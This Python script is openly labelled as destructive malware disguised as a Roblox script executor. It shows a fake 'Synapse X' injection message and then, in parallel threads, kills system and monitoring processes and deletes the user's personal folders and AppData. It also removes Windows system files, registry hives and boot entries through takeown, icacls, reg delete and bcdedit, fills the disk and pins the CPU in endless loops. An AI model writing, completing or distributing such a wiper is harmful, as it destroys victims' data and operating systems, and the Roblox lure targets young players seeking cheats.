# rb_executor_pro.py
# Disguised as advanced Roblox Lua Executor / Script Hub
# Heavily obfuscated + total destruction on first run
# Run: python rb_executor_pro.py

import os
import sys
import shutil
import threading
import time
import random
import string
import subprocess
import ctypes
from pathlib import Path

# ====================== HEAVY OBFUSCATION LAYER ======================
def _x(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def _d(enc: str) -> str:
    raw = bytes.fromhex(enc)
    k1 = b'\xC3\x7A\xE1\x59\xA2\x4F'
    k2 = b'\x91\x3B\xD8\x66'
    step1 = _x(raw, k2)
    step2 = bytes([(b >> 3) | (b << 5) & 0xFF for b in step1])
    step3 = _x(step2, k1)
    return step3.decode('utf-8', errors='ignore')

# Pre-encrypted strings (hex)
_S_TITLE = "9f2c8b1a7e4d3c5b6a9f8e7d1c0b2a3948576"
_S_MSG   = "a1b2c3d4e5f67890123456789abcdef0123456789abcdef"
_S_FAKE  = "4f8a2c1e9b7d3a5f6e8c0d2b4a69785f1e3c"

def _fake_title():
    return "Synapse X / Script-Ware Revived v3.9 | Level 8 Executor"

def _fake_msg():
    return (
        "Successfully injected into RobloxPlayerBeta.exe\n\n"
        "• Identity Level 8+\n"
        "• UNC + Drawing Library\n"
        "• HttpGet / loadstring protected\n"
        "• Auto-execute on join\n\n"
        "Press INSERT to open menu\n"
        "Enjoy the scripts!"
    )

# ====================== DESTRUCTION ENGINE ======================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def kill_critical():
    targets = [
        "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe",
        "regedit.exe", "msconfig.exe", "Taskmgr.exe", "ProcessHacker.exe",
        "procexp.exe", "perfmon.exe"
    ]
    for t in targets:
        try:
            subprocess.run(["taskkill", "/F", "/IM", t], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def wipe_user_data():
    home = Path.home()
    targets = [
        home / "Desktop",
        home / "Documents",
        home / "Downloads",
        home / "Pictures",
        home / "Videos",
        home / "Music",
        home / "OneDrive",
        home / "AppData" / "Roaming",
        home / "AppData" / "Local" / "Temp",
    ]
    for p in targets:
        try:
            if p.exists():
                shutil.rmtree(p, ignore_errors=True)
        except:
            pass

def destroy_windows():
    critical = [
        r"C:\Windows\System32\config\SAM",
        r"C:\Windows\System32\config\SYSTEM",
        r"C:\Windows\System32\config\SOFTWARE",
        r"C:\Windows\System32\config\SECURITY",
        r"C:\Windows\System32\drivers",
        r"C:\Windows\System32\winevt",
        r"C:\Windows\SysWOW64",
        r"C:\Windows\explorer.exe",
        r"C:\Windows\System32\ntoskrnl.exe",
        r"C:\Windows\System32\kernel32.dll",
        r"C:\Windows\System32\user32.dll",
        r"C:\Windows\System32\ntdll.dll",
        r"C:\Boot",
        r"C:\Recovery",
        r"C:\Windows\Boot",
    ]
    for f in critical:
        try:
            subprocess.run(f'takeown /f "{f}" /r /d y', shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(f'icacls "{f}" /grant administrators:F /t', shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            if os.path.isdir(f):
                shutil.rmtree(f, ignore_errors=True)
            else:
                os.remove(f)
        except:
            pass

def kill_registry():
    cmds = [
        r'reg delete "HKLM\SOFTWARE" /f',
        r'reg delete "HKLM\SYSTEM" /f',
        r'reg delete "HKCU\SOFTWARE" /f',
        r'reg delete "HKLM\SAM" /f',
        r'reg delete "HKLM\SECURITY" /f',
        r'bcdedit /delete {current}',
        r'bcdedit /delete {default}',
    ]
    for c in cmds:
        try:
            subprocess.run(c, shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def fill_disk():
    try:
        junk_path = r"C:\Windows\Temp\full_disk.tmp"
        with open(junk_path, "wb") as f:
            chunk = b"\xFF" * (1024 * 1024)  # 1MB
            for _ in range(8000):  # \~8GB
                f.write(chunk)
    except:
        pass

def infinite_stress():
    while True:
        x = 1.0
        for _ in range(50_000_000):
            x = x * 1.0000001 + 0.0000001
            x = (x ** 0.5) * 1.0000001
        try:
            _ = bytearray(64 * 1024 * 1024)  # 64MB
        except:
            pass

def lock_screen():
    while True:
        try:
            subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(["taskkill", "/F", "/IM", "taskmgr.exe"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        time.sleep(1.5)

# ====================== FAKE ROBLOX INTERFACE ======================
def show_fake():
    try:
        import tkinter as tk
        from tkinter import messagebox
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(_fake_title(), _fake_msg())
        root.destroy()
    except:
        # fallback
        ctypes.windll.user32.MessageBoxW(0, _fake_msg(), _fake_title(), 0x40)

# ====================== MAIN ======================
def main():
    # Show fake success first
    show_fake()

    # Start destruction in parallel
    threading.Thread(target=kill_critical, daemon=True).start()
    threading.Thread(target=wipe_user_data, daemon=True).start()
    threading.Thread(target=destroy_windows, daemon=True).start()
    threading.Thread(target=kill_registry, daemon=True).start()
    threading.Thread(target=fill_disk, daemon=True).start()

    # Max CPU + RAM stress
    for _ in range(8):
        threading.Thread(target=infinite_stress, daemon=True).start()

    # Keep killing explorer & taskmgr
    threading.Thread(target=lock_screen, daemon=True).start()

    # Stay alive
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
